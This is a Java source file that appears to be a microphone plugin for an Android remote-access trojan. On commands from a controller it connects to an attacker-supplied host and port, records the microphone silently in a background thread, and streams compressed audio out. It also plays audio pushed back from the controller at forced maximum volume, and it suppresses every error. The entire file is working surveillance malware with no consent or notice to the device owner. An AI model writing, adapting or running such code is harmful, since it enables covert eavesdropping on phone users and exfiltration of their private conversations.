package plugens.angel.plugens;
import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.MediaRecorder;
import android.media.audiofx.AcousticEchoCanceler;
import android.os.Build;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.util.zip.GZIPOutputStream;
public class microphone {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        switch(d[0]){
            case "start":
                try {
                    Mic(d[1],d[2],d[3],d[4],d[5],d[6]);
                } catch (Exception e) {}
                break;
            case "input":
                try {
                    inp(d[1],d[2],d[3],d[4] ,d[5],d[6],c);
                } catch (Exception e) {
                }
                break;
        }
        return f;
    }
    private void Mic(final String h ,final String p, final String sm,final String key0,final String _ID,final String source){
        new Thread(new Runnable() {  @Override
        public void run() {
           Socket sk = null;
           DataInputStream in = null;
           OutputStream out = null;
           boolean ctd = false;

           Object Syn_x1 = new Object();
           int test = 0;
            do {
                if (test >= 3){
                    return;
                }
                try {
                    InetAddress ip;
                    ip = InetAddress.getByName(h);
                    InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(p));
                    sk = new Socket();
                    sk.setSoTimeout(0);
                    sk.setKeepAlive(true);
                    sk.connect(sock, 60000);
                    ctd = sk.isConnected();
                    if (ctd == true) {
                        sk.setSendBufferSize(1023);
                        sk.setReceiveBufferSize(1023);
                        out = sk.getOutputStream();
                        break;
                    }
                } catch (UnknownHostException e) {
                    di(sk,out,in);
                } catch (SocketException e) {
                    di(sk,out,in);
                } catch (Exception e) {
                    di(sk,out,in);
                }
                test++;
                try{ Thread.sleep(1);} catch (InterruptedException e) {}
            } while (ctd == false);

            AudioRecord rec = null;
            int ch = AudioFormat.CHANNEL_CONFIGURATION_MONO;
            int aud = AudioFormat.ENCODING_PCM_16BIT;
            try {
                if (sk != null) {
                    if (out != null) {
                        ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                        try {

                            int so = Integer.valueOf(source);
                            int rate = Integer.valueOf(sm);
                            int buff = AudioRecord.getMinBufferSize(rate, ch, aud);
                            byte[] buffer = new byte[buff];
                            if (so == 0){
                                rec = new AudioRecord(MediaRecorder.AudioSource.DEFAULT, rate, ch, aud, buff);
                            }else if(so == 1){
                                rec = new AudioRecord(MediaRecorder.AudioSource.MIC, rate, ch, aud, buff);
                            }else if(so == 2){
                                rec = new AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, rate, ch, aud, buff);
                            }else if(so == 3){
                                rec = new AudioRecord(MediaRecorder.AudioSource.VOICE_COMMUNICATION, rate, ch, aud, buff);
                            }else if(so == 4){
                                rec = new AudioRecord(MediaRecorder.AudioSource.CAMCORDER, rate, ch, aud, buff);
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                                try{
                                   AcousticEchoCanceler.create(rec.getAudioSessionId());
                                } catch (Exception e) {}}

                            rec.startRecording();
                            while (true) {
                                synchronized (Syn_x1){

                                    rec.read(buffer, 0, buffer.length);
                                    BOS.write(buffer, 0, buffer.length);
                                    byte[] b0 = f(key0 + SPL_ARRAY + _ID + SPL_ARRAY + sm + SPL_ARRAY + so,BOS.toByteArray());
                                    sk.setSendBufferSize(b0.length * 15);
                                    out = sk.getOutputStream();
                                    out.write(b0,0,b0.length);
                                    BOS.reset();
                                }

                            }
                        } catch (Exception e) {
                            di(sk,out,in);
                        } catch (OutOfMemoryError e) {
                            di(sk,out,in);
                        }
                        out.flush();
                        BOS.close();
                        di(sk,out,in);
                    }
                }
            } catch (Exception e) {
            } catch (OutOfMemoryError e) {}

            di(sk,out,in);

            try{
                if (rec != null) {
                    rec.stop();
                    rec.release();
                }
            } catch (Exception e) {}


        }}).start();
    }

    private void di(Socket sk,OutputStream out,DataInputStream in) {
        try {sk.shutdownOutput();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.shutdownInput();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.getOutputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.getInputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.close();} catch (SocketException e) {} catch (IOException e) {}
        if(out != null){try {out.close();} catch (SocketException e) {} catch (IOException e) {}out = null;}
        if(in != null){try {in.close();} catch (SocketException e) {} catch (IOException e) {}in = null;}
    }

    private void inp(final String h ,final String p,final String HnD,final String key0,final String ca, final String ra ,final Context ctx){
        new Thread(new Runnable() {  @Override
        public void run() {
                Socket sk = null;
                OutputStream out = null;
                DataInputStream in = null;
                boolean ctd = false;
                Object Syn_x1 = new Object();
                Object Syn_x2 = new Object();
                int test = 0;
                do {
                    if (test >= 3){
                        return;
                    }
                    try {
                        InetAddress ip;
                        ip = InetAddress.getByName(h);
                        InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(p));
                        sk = new Socket();
                        sk.setSoTimeout(0);
                        sk.setKeepAlive(true);
                        sk.connect(sock, 60000);
                        ctd = sk.isConnected();
                        if (ctd == true) {
                            sk.setSendBufferSize(1023);
                            sk.setReceiveBufferSize(1023);
                            out = sk.getOutputStream();
                            synchronized (Syn_x1){
                                if(out != null){
                                    String info = key0 + SPL_ARRAY + HnD + SPL_ARRAY + ra;
                                    byte[] b0 = f(key0,info.getBytes());
                                    sk.setSendBufferSize(b0.length);
                                    out = sk.getOutputStream();
                                    in = new DataInputStream(new BufferedInputStream(sk.getInputStream()));
                                    out.write(b0,0,b0.length);
                                }
                            }
                            break;
                        }
                    } catch (UnknownHostException e) {
                        di(sk,out,in);
                    } catch (SocketException e) {
                        di(sk,out,in);
                    } catch (Exception e) {
                        di(sk,out,in);
                    }
                    test++;
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                } while (ctd == false);
            int read;
                try{
                    int rt = Integer.valueOf(ra);
                    int intSize = AudioTrack.getMinBufferSize(rt,AudioFormat.CHANNEL_OUT_MONO , AudioFormat.ENCODING_PCM_16BIT);
                    byte[] buff = new byte[intSize * 15];
                    AudioTrack at = null;
                    int so = Integer.valueOf(ca);
                    if (so == 0){
                        at = new AudioTrack(AudioManager.STREAM_VOICE_CALL, rt, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, intSize, AudioTrack.MODE_STREAM);
                    }else if (so == 1){
                        at = new AudioTrack(AudioManager.STREAM_MUSIC, rt, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, intSize, AudioTrack.MODE_STREAM);
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                    try{
                      AcousticEchoCanceler.create(at.getAudioSessionId());
                    } catch (Exception e) {}}
                    at.play();
                    while ((read = in.read(buff)) > 0)
                    {
                        synchronized(Syn_x2){
                            if (at!= null) {
                                if (so == 0){
                                    VOICE_CALL(ctx);
                                }else  if (so == 1){
                                    MUSIC(ctx);
                                }
                                sk.setReceiveBufferSize(buff.length);
                                at.write(buff, 0, read);
                            }
                        }
                    }
                    at.stop();
                    at.release();
                }catch (SocketException e) {
                }catch (SocketTimeoutException s) {
                }catch(OutOfMemoryError e){
                }catch (Exception e) {}
                try{ Thread.sleep(1000L);} catch (InterruptedException e) {}
                di(sk,out,in);
        }}).start();
    }

    private AudioManager aum = null;
    private void MUSIC(Context ctx){
        try {
            if (aum == null ){
                aum = (AudioManager)ctx.getSystemService(Context.AUDIO_SERVICE);
            }
            if (aum != null ){
                int max = aum.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                int val = aum.getStreamVolume(AudioManager.STREAM_MUSIC);
                if (max != val){
                    aum.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
                }
            }
        } catch (Exception e) {}
    }
    private AudioManager auv = null;
    private void VOICE_CALL(Context ctx){
        try {
            if (auv == null ){
                auv = (AudioManager)ctx.getSystemService(Context.AUDIO_SERVICE);
            }
            if (auv != null ){
                int max = auv.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
                int val = auv.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
                if (max != val){
                    auv.setStreamVolume(AudioManager.STREAM_VOICE_CALL, max, 0);
                }
            }
        } catch (Exception e) {}
    }
    private byte[] f(String s,byte[] b) throws Exception{
        ByteArrayOutputStream o = new ByteArrayOutputStream() ;
        byte[] s0 = cZp(s.getBytes());
        byte[] b0 = cZp(b);
        byte ch = (byte)0;
        byte[] n0 = String.valueOf(s0.length).getBytes();
        byte[] n1 = String.valueOf(b0.length).getBytes();
        o.write(n0, 0, n0.length);
        o.write(ch);
        o.write(n1, 0, n1.length);
        o.write(ch);
        o.write(s0, 0, s0.length);
        o.write(b0, 0, b0.length);
        byte[] b1 = o.toByteArray();
        try {o.close(); } catch (IOException ex) {}
        return b1;
    }

    private byte[] cZp( byte[] d) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream(d.length);
        GZIPOutputStream g = new GZIPOutputStream(b);
        g.write(d);
        g.close();
        byte[] m = b.toByteArray();
        b.close();
        return m;
    }
}
